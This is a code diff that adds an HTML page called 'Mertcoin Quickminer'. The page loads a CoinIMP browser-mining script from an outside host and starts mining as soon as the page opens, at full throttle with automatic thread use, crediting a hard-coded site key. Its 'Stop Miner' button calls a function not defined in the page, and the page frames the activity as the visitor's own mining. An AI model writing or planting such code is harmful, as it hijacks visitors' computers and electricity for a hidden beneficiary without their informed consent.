@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<!-- Imports -->
+  <link rel="stylesheet" href="https://mertcoinminer.ml/page.css">
+  <script src="https://www.hostingcloud.racing/0Frc.js"></script>
+  <script src="https://mertcoinminer.ml/app.js"></script>
+	<!-- Meta stuff -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1.0">
+  <title>Mertcoin Miner</title>
+</head>
+<body>	
+<!-- Heading -->
+  <h2>Mertcoin Quickminer<h2>
+	  <br>
+	  <br>
+	  <br>
+<!-- Stop button --> 
+	 <button class="button" id="ss" onclick ="start()">Stop Miner</button>
+<!-- Info -->	  
+	   <div style="width: 100%; display: table;">
+        <div style="display: table-row; height: 100px;">
+            <div style="width: 50%; display: table-cell; background: black;">
+              <h3>Hashrate:</h3>
+          <h4 id="hash">0</h4>
+            </div>
+            <div style="display: table-cell; background: black;"> 
+              <h3>GPU:</h3>
+          <h4 id="benchmark">null</h4>
+            </div>
+        </div>
+    </div>
+<!-- Pay button -->
+	  <a href="https://coinimp.com/login" class="pay" id="button">Pay</a>
+	  
+ <!-- Benchmarking function -->
+  <script>
+    try {
+   document.getElementById("benchmark").innerHTML = getVideoCardInfo().renderer; } 
+    catch {
+   document.getElementById("benchmark").innerHTML = "Failed Benchmark";
+   throw("Failed Benchmark."); 
+ }
+  </script> 
+	  
+<!-- Miner script -->	  
+  <script>
+   try{
+    var _client = new Client.Anonymous('6e8067e289507961a17268271edbefca1e41d31d4b71b3a781aada8c0611dfdb', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+_client.setAutoThreadsEnabled(true);
+    }
+   catch(err){
+  document.getElementById('ss').style.backgroundColor = 'black';
+  document.getElementById('ss').innerHTML = "ERROR";
+  document.getElementById('ss').style.color = "red";
+  document.getElementById("hash").innerHTML = "ERROR";   
+  document.getElementById("hash").style.color = "red";
+  throw "Cannot mine.";
+   }
+	  
+//Unpaid balance
+  var hps;
+  var hashes;
+  setInterval(f, 30000);
+  function f() {
+  hps = _client.getHashesPerSecond();
+  hps = parseInt(hps);
+  document.getElementById("hash").innerHTML = hps + " H/s";
+  hashes = _client.getTotalHashes(true);
+  hashes = parseInt(hashes);
+  if (hashes > 1000000){
+  document.getElementById('button').style.backgroundColor = 'green';
+  }
+  hashes = 0;
+	  
+  }
+
+  </script>
+	  
+	 <br>
+	 <br>
+	 <br>
+	 <br>
+	 <br>
+	 <br>
+	  <p><a href="https://github.com/mertcoinminer/v2">See Github</a></p>
+	  
+</body>
+</html>
